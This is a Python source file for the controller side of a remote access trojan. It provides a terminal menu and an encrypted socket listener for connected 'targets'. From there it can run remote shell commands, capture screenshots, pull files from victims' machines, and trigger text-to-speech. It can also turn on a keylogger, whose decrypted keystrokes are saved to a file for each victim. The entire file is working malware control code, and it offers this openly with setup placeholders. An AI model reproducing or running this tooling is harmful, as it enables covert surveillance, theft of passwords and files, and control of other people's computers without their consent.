import curses, time, datetime, re, os, rsa
import threading, socket
from curses.textpad import Textbox
from PIL import Image
from io import BytesIO
from fastapi import FastAPI, Request, Depends, HTTPException, status
from fastapi.security import APIKeyHeader
from pydantic import BaseModel
import uvicorn
import json

menus = {
    'main':['Connections', 'Commands', 'Exit'], 
    'connections':['Back'], 
    'commands':['TTS', 'Send commands', 'Toggle heartbeat', 'Screenshot', 'Filetransfer', 'Keylogger', 'Back'], 
    'filetransfer':['Recieve', 'Send', 'Back']
}
my_api_key = 'Your_custom_api_key_here'
my_api_port = 55668 #feel free to change this.
my_ip = 'your_ip_here'
my_socket_port = 55667 #feel free to change this.
#Fetch personal stuff, Feel free to delete and just hard code this stuff
with open('personal.json', 'r') as file:
    settings = json.load(file)
    my_api_key = settings.get('apiKey', None)
    my_ip = settings.get('ip', None)
#Fetch personal stuff, Feel free to delete and just hard code this stuff


#REST API
ttsDone = []

app = FastAPI()

api_key = APIKeyHeader(name="X-API-Key", auto_error=False)

def check_api_key(api_key: str = Depends(api_key)):
    if api_key != my_api_key:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid API Key",
        )

@app.get('/tts', dependencies=[Depends(check_api_key)])
def root(request: Request):
    client_ip = request.client.host
    if client_ip in clientIP:
        ttsDone.append(client_ip)

class KeyInput(BaseModel):
    keys: list[list[int]]

@app.post('/keys', dependencies=[Depends(check_api_key)])
def root(data: KeyInput, request: Request):
    ctrl = False
    client_ip = request.client.host
    if client_ip in clientIP:
        if not os.path.exists(f'{names[clientIP.index(client_ip)]}_keylogger_data.txt'):
            open(f'{names[clientIP.index(client_ip)]}_keylogger_data.txt', 'w').close()
        with open(f'{names[clientIP.index(client_ip)]}_keylogger_data.txt', 'r+') as file, open(f'{names[clientIP.index(client_ip)]}_keylogger_data_raw.txt', 'a') as raw:
            file_contents = file.read()
            file.truncate()
            file.seek(0)
            for key in data.keys:
                key = rsa.decrypt(bytes(key), privateKey).decode('utf-8')
                key = key.replace("'", '')
                if ctrl == True:
                    if key == 'Key.Backspace':
                        file_contents = ' '.join(file_contents.split(' ')[:-1])
                    ctrl = False
                if key == 'Key.ctrl_l' or key == 'Key.ctrl_r':
                    ctrl = True
                elif key == 'Key.enter':
                    file_contents += '\n'
                elif key == 'Key.space':
                    file_contents += ' '
                elif key == 'Key.backspace':
                    file_contents = file_contents[:-1]
                else:
                    file_contents += key
                if len(key) > 1:
                    raw.write(f'<{key}>')
                else:
                    raw.write(key)
            file.write(file_contents)

def run_fastapi():
    uvicorn.run(app, host=my_ip, port=my_api_port)
#REST API

#Socket Server
headerSize = 10
publicKey, privateKey = rsa.newkeys(1024)

clients = []
clientIP = []
names = []
clientKeys = []
def server(info: list):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((my_ip, my_socket_port))
    s.listen(5)

    while 1:
        client, addr = s.accept()
        client.sendall(publicKey.save_pkcs1('PEM'))
        clientKeys.append(rsa.PublicKey.load_pkcs1(client.recv(1024)))
        name = rsa.decrypt(client.recv(1024), privateKey).decode('utf-8')
        info.append(f'[+] Connection from {addr} has been established! [{name}]')
        menus.update({'connections':[addr[0]]+menus['connections']})
        names.append(name)
        clients.append(client)
        clientIP.append(addr[0])

def send(client, info: list, header: str, message='', output=False):
    global selectedClient
    try:
        packets = [rsa.encrypt(packet, clientKeys[clients.index(client)]) for packet in [f'{header:<{headerSize}}{message}'[i*100:(i+1)*100].encode('utf-8') for i in range(-(-len(f'{header:<{headerSize}}{message}')//100))]]
        client.sendall(rsa.encrypt(str(len(packets)).encode('utf-8'), clientKeys[clients.index(client)]))
        for packet in packets:
            client.sendall(packet)
        if output == True:
            output = bytes()
            packetsAmount = int(rsa.decrypt(client.recv(128), privateKey).decode('utf-8'))
            for _ in range(packetsAmount):
                output += rsa.decrypt(client.recv(128), privateKey)
            try:
                return output.decode('utf-8')
            except:
                return output
        else:
            return True
    except Exception as e:
        if client in clients:
            index = clients.index(client)
            clients.remove(client)
            client.close()
            ip = clientIP.pop(index)
            menus['connections'].remove(ip)
            name = names.pop(index)
            clientKeys.pop(index)
            info.append(f'[-] Connection to {ip} [{name}] was lost.                                            {e}')
            selectedClient = ''
        if output == True:
            return None
        else:
            return False
#Socket Server



def printMenu(stdscr, currentRow, menu, info):
    global selectedClient
    stdscr.clear()
    h, w = stdscr.getmaxyx()

    time = str(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))

    try:
        name = f' [{names[clientIP.index(selectedClient)]}]'
    except:
        name = ''
    selected = f'Selected: {selectedClient}{name}'

    stdscr.addstr(0, w//2 - len(time)//2, time)
    stdscr.addstr(1, w//2 - len(selected)//2, selected)
    for i, row in enumerate(menu):
        x = w//2 - len(row)//2
        y = h//2 - len(menu)//2 + i
        if i == currentRow:
            stdscr.attron(curses.color_pair(1))
        stdscr.addstr(y, x, row)
        stdscr.attroff(curses.color_pair(1))
    
    for i, text in enumerate(info[-h//3:]):
        newline = '\n'
        stdscr.addstr(i, 0, f'{";".join(text.strip().split(newline))[:w//2-20]:<{w//2-20}}|')
    stdscr.addstr(h//3+1, 0, f'{"_"*(w//2-20)}|')

    stdscr.refresh()

def sendCommand(stdscr, info):
    global selectedClient
    stdscr.addstr(0, 0, 'Command(BLANK = back): ')
    win = curses.newwin(5, 100, 0, 23)
    box = Textbox(win)
    curses.curs_set(1)
    stdscr.refresh()
    box.edit()
    command = str(box.gather()).strip().replace('\n', '')
    if command != '':
        output = send(clients[clientIP.index(selectedClient)], info, 'cmd:', command, output=True)
        if command != None:
            info.append(f'[*] {command} > {output}')
    curses.curs_set(0)

def getScreenshot(stdscr, info):
    global selectedClient
    stdscr.addstr(0, 0, 'Quality(BLANK = back):     %\nMight freeze for a good bit.')
    win = curses.newwin(1, 4, 0, 23)
    box = Textbox(win)
    curses.curs_set(1)
    stdscr.refresh()
    box.edit()
    quality = str(box.gather()).strip()
    if quality != '':
        if not quality.isdigit():
            info.append('[*] Quality can only contain basic numbers')
        else:
            bytes_data = send(clients[clientIP.index(selectedClient)], info, 'sc:', quality, output=True)
            image_bytes = BytesIO(bytes_data)
            image = Image.open(image_bytes)
            image.save(f'{names[clientIP.index(selectedClient)]}_Screenshot_{str(datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S"))}.png')
            info.append('[*] Screenshot recieved')
    curses.curs_set(0)

def getFile(stdscr, info):
    global selectedClient
    stdscr.addstr(0, 0, 'Beware file transfers can take a long time.\nFile name(BLANK = back):')
    win = curses.newwin(5, 100, 1, 25)
    box = Textbox(win)
    curses.curs_set(1)
    stdscr.refresh()
    box.edit()
    filePath = str(box.gather()).strip().replace('\n', '').replace('%:', '"').replace('%;', '\'')
    fileName = filePath.split('\\')[-1]
    if filePath != '':
        output = send(clients[clientIP.index(selectedClient)], info, 'file:', filePath, output=True)
        if output == 'Invalid path':
            info.append('[*] Invalid file path.')
        else:
            with open(f'{names[clientIP.index(selectedClient)]}_{"".join(fileName.split(".")[:-1])}_{str(datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S"))}.{fileName.split(".")[-1]}', 'w') as file:
                file.write(output.replace('\n', ''))
            info.append('[*] File recieved')
    curses.curs_set(0)

def tts(stdscr, info):
    global selectedClient
    stdscr.addstr(0, 0, 'Text(BLANK = back): ')
    win = curses.newwin(5, 100, 0, 20)
    box = Textbox(win)
    curses.curs_set(1)
    stdscr.refresh()
    box.edit()
    text = str(box.gather()).strip().replace('\n', '')
    if text != '':
        stdscr.clear()
        stdscr.addstr(0, 0, 'Volume(BLANK = 25):     %')
        win = curses.newwin(1, 4, 0, 20)
        box = Textbox(win)
        stdscr.refresh()
        box.edit()
        volume = str(box.gather()).strip()
        if not volume.isdigit():
            volume = '25'
        stdscr.clear()
        stdscr.addstr(0, 0, 'Rate WPM(BLANK = 200, range 50 to 300): ')
        win = curses.newwin(1, 4, 0, 40)
        box = Textbox(win)
        stdscr.refresh()
        box.edit()
        rate = str(box.gather()).strip()
        if not rate.isdigit():
            rate = '200'
        else:
            if int(rate) not in range(50, 301):
                rate = '200'
        output = send(clients[clientIP.index(selectedClient)], info, 'tts:', f'{text};{volume};{rate}', output=True)
        if output == 'True':
            info.append(f'[*] tts now in progress. All sent commands will now freeze until tts is done.')
        else:
            info.append(f'[*] tts failed: {output}')
    curses.curs_set(0)

def log(info):
    if not os.path.exists('logs.txt'):
        open('logs.txt', 'w').close()
    with open('logs.txt', 'w') as logs:
        for line in info:
            logs.write(line + '\n')


def main(stdscr):
    curses.curs_set(0)
    curses.init_pair(1, curses.COLOR_BLACK, curses.COLOR_WHITE)
    menu = 'main'
    currentRowIndex = 0
    stdscr.nodelay(True)

    global selectedClient
    info = []
    infoLen = 0
    selectedClient = ''
    thread = threading.Thread(target=server, args=(info,), daemon=True)
    thread.start()
    fastapi_thread = threading.Thread(target=run_fastapi, daemon=True)
    fastapi_thread.start()

    while 1:
        if ttsDone != []:
            ip = ttsDone.pop(0)
            info.append(f'[{names[clientIP.index(ip)]}]({ip}) tts Done!')
        if len(info) > infoLen:
            infoLen = len(info)
            log(info)

        printMenu(stdscr, currentRowIndex, menus[menu], info)
        time.sleep(.03)
        try:
            key = stdscr.getch()
        except:
            key = None

        stdscr.clear()

        if key == curses.KEY_UP and currentRowIndex > 0:
            currentRowIndex -= 1
        elif key == curses.KEY_DOWN and currentRowIndex < len(menus[menu])-1:
            currentRowIndex += 1
        elif key == curses.KEY_ENTER or key in [10, 13]:
            if menus[menu][currentRowIndex] == 'Exit':
                for client in clients:
                    send(client, info, 'exit')
                break
            elif menus[menu][currentRowIndex] == 'Back':
                if menu == 'filetransfer':
                    menu = 'commands'
                else:
                    menu = 'main'
                currentRowIndex = 0
            elif menus[menu][currentRowIndex] == 'Connections':
                menu = 'connections'
                currentRowIndex = 0
            elif menus[menu][currentRowIndex] == 'Commands':
                menu = 'commands'
                currentRowIndex = 0
            elif re.match(r'[0-9]{1,3}[.][0-9]{1,3}[.][0-9]{1,3}[.][0-9]{1,3}', menus[menu][currentRowIndex]) != None:
                selectedClient = menus[menu][currentRowIndex]
                menu = 'main'
                currentRowIndex = 0
            elif menus[menu][currentRowIndex] == 'Send commands':
                if selectedClient != '':
                    sendCommand(stdscr, info)
                else:
                    info.append('[-] No target selected!')
            elif menus[menu][currentRowIndex] == 'Toggle heartbeat':
                info.append('[*] Heartbeat not implemented.')
            elif menus[menu][currentRowIndex] == 'Screenshot':
                if selectedClient != '':
                    getScreenshot(stdscr, info)
                else:
                    info.append('[-] No target selected!')
            elif menus[menu][currentRowIndex] == 'Filetransfer':
                menu = 'filetransfer'
                currentRowIndex = 0
            elif menus[menu][currentRowIndex] == 'Recieve':
                if selectedClient != '':
                    getFile(stdscr, info)
                else:
                    info.append('[-] No target selected!')
            elif menus[menu][currentRowIndex] == 'Send':
                info.append('[*] Send not implemented')
            elif menus[menu][currentRowIndex] == 'TTS':
                if selectedClient != '':
                    tts(stdscr, info)
                else:
                    info.append('[-] No target selected!')
            elif menus[menu][currentRowIndex] == 'Keylogger':
                if selectedClient != '':
                    keyloggerON = send(clients[clientIP.index(selectedClient)], info, 'keylog:', output=True)
                    if keyloggerON == 'True':
                        info.append('[*] Keylogger activated')
                    elif keyloggerON == 'False':
                        info.append('[*] Keylogger deactivated')
                else:
                    info.append('[-] No target selected!')
        elif key == 27:
            menu = 'main'
            currentRowIndex = 0
        
        stdscr.refresh()

curses.wrapper(main)
print('Shutting down...')